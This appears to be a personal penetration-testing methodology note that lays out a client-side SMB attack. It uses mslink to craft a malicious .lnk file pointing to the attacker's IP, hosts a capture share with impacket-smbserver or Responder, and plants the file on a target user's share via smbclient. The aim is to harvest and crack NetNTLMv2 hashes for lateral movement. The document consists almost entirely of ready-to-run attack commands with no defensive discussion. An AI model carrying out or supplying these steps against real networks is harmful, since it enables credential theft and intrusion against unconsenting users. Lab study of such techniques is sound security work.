#### **You need access to a target user smbshare, and for them to look or click the malicous file.**
#### **This attack will give you a netntlmv2 hash if the user (or anyone looking at the file within the folder will trigger the event)**

```
wget <https://www.mamachine.org/mslink/mslink_v1.3.sh>
```

Creating the malicous link file. (The ip you wanna be using here is your own)
```./mslink_v1.3.sh -l whatever -n hook -i \\\\10.13.31.108\\share -o hook.lnk```

Then host your smbserver and make sure to have the .lnk file in same folder:
```impacket-smbserver share ./ -smb2support```

Now connect to the users remote share and place malicous .lnk file:
```smbclient \\\\10.10.20.141\\Files -U myrtleowe```
```put hook.lnk```

Wait for the event to trigger (for target user to open file or have folder open with file in it):
![unnamed_5a4c6b2928424c909d275090682afd2f](docs/Attachments/_Methodology/4.%20Client%20Side%20Attacks/smb%20mslink%20file/{{notename}}-202605011742.png)

(you can do with responder instead of smbserver too)
![unnamed_f0adb844498f420fa6a7d898d1fc458c](docs/Attachments/_Methodology/4.%20Client%20Side%20Attacks/smb%20mslink%20file/{{notename}}-202605011742-1.png)

And bam, it triggeres. Next up is trying to crack this netntlmv2 hash:

![unnamed_160e27814f054b089b54724c871daf8c](docs/Attachments/_Methodology/4.%20Client%20Side%20Attacks/smb%20mslink%20file/{{notename}}-202605011742-2.png)
Awesome, now we can move laterally to MichelleWat!